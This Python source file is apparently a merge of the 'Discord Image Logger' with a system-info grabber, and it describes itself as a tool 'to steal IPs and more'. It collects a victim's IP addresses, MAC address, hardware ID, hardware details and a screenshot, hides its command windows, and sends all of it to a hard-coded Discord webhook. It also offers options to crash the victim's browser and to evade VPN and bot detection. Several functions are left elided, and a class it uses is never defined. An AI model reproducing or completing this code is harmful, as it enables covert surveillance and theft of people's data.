# Discord Image & System Info Logger
# Combined from DeKrypt's Image Logger and your system info script

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import socket, uuid, platform, psutil, threading, subprocess, re, pyautogui, os
from PIL import ImageGrab # Not used directly, but good to have

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# --- CONFIG (COMBINED) ---
config = {
    # ... (DeKrypt's config as before) ...
    "webhook": "https://discord.com/api/webhooks/1337690537716617236/65it_yqKBVgIQeCPJVGVUqDmz3S7bmXhcG-f5gUIFzdAHKO0N5yoauwZyBvQzi54y-BF", # Replace with your actual webhook URL
    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}


blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.


# --- SYSTEM INFO FUNCTIONS (from your script) ---
def get_gpu_info(): # ... (same as your script, with error handling)
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic path win32_videocontroller get caption",
            shell=True, startupinfo=startupinfo, stderr=subprocess.PIPE  # Capture errors
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except subprocess.CalledProcessError as e:
        print(f"GPU Info Error: {e}") # Print the error
        return "Could not retrieve"
    except Exception as e:
        print(f"GPU Info Error: {e}") #Print the error
        return "Could not retrieve"

def get_local_ip(): # ... (same as your script)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connect to a public DNS server
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Local IP Error: {e}")
        return "N/A"

def get_public_ip(): # ... (same as your script)
    try:
        return requests.get("https://api64.ipify.org?format=json", timeout=3).json()["ip"]
    except requests.exceptions.RequestException as e:
        print(f"Public IP Error: {e}")
        return "Could not retrieve"

def get_mac_address(): # ... (same as your script)
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except Exception as e:
        print(f"MAC Address Error: {e}")
        return "N/A"

def get_hardware_id(): # ... (same as your script)
    try:
        return str(uuid.UUID(int=uuid.getnode()))
    except Exception as e:
        print(f"Hardware ID Error: {e}")
        return "N/A"


def get_system_info(): # ... (same as your script)
    info = { # ... (rest of the system info collection)
        "Hostname": socket.gethostname(),
        "Local IP": get_local_ip(),
        "MAC Address": get_mac_address(),
        "Hardware ID": get_hardware_id(),
        "OS": f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
        "OS Version": platform.version(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM Size": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        "Disk Storage": f"{round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB"
    }
    return info

def get_motherboard_info(): # ... (same as your script, with error handling)
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic baseboard get product",
            shell=True, startupinfo=startupinfo, stderr=subprocess.PIPE # Capture errors
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except subprocess.CalledProcessError as e:
        print(f"Motherboard Info Error: {e}") # Print the error
        return "Could not retrieve"
    except Exception as e:
        print(f"Motherboard Info Error: {e}") # Print the error
        return "Could not retrieve"

def send_system_info_to_discord(info): # Modified to fit into DeKrypt's reporting
    embed = {
        "title": "Image Logger - System Info",
        "color": config["color"],
        "description": "**System Information:**\n\n" + "\n".join(f"> **{key}:** {value}" for key, value in info.items())
    }
    requests.post(config["webhook"], json={"username": config["username"], "embeds": [embed]})

def take_screenshot(): # ... (same as your script)
    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Screenshot capture failed: {e}")
        return None

def send_screenshot_to_discord(): # ... (same as your script)
    screenshot_path = take_screenshot()
    if not screenshot_path:
        return

    try:
        with open(screenshot_path, "rb") as file:
            files = {"file": file}
            response = requests.post(config["webhook"], files=files)
            response.raise_for_status()
        print("Screenshot sent successfully!")
        os.remove(screenshot_path)
    except requests.exceptions.RequestException as e:
        print(f"Failed to send screenshot: {e}")
    except Exception as e:
        print(f"Error sending screenshot: {e}")


# --- DEKrypt's FUNCTIONS (mostly the same, with modifications) ---
# ... (botCheck, reportError - same as before) ...

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    # ... (DeKrypt's makeReport logic, up to the embed creation) ...

    embed = { # ... (DeKrypt's embed info) ...
        # Add the system info here:
        "fields": [ # Add a fields section for the system info
            {"name": "System Information", "value": "Collecting...", "inline": False} # Placeholder
        ]
    }

    # ... (rest of DeKrypt's makeReport logic) ...

    # Collect and send system info (in a separate thread to avoid blocking):
    def collect_and_send_info():
        system_info = get_system_info()
        threads = [
            threading.Thread(target=lambda: system_info.update({"Public IP": get_public_ip()})),
            threading.Thread(target=lambda: system_info.update({"GPU": get_gpu_info()})),
            threading.Thread(target=lambda: system_info.update({"Motherboard": get_motherboard_info()})),
        ]

        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        send_system_info_to_discord(system_info)
        # Update the embed with the actual system info (after it's collected):
        system_info_string = "\n".join(f"> **{key}:** {value}" for key, value in system_info.items())
        embed["embeds"][0]["fields"][0]["value"] = system_info_string
        requests.post(config["webhook"], json=embed) # Send the updated embed

        send_screenshot_to_discord() # Send screenshot after system info

    threading.Thread(target=collect_and_send_info).start() # Run in the background

    return info # Return the IP info (from ip-api.com)

# ... (binaries, ImageLoggerAPI class - same as before) 


if __name__ == "__main__":
    from http.server import HTTPServer  # Make sure this import is present
    server = HTTPServer(('', 80), ImageLoggerAPI)  # Corrected line
    print(f"{__app__} {__version__} by {__author__} started on port 80")
    server.serve_forever()
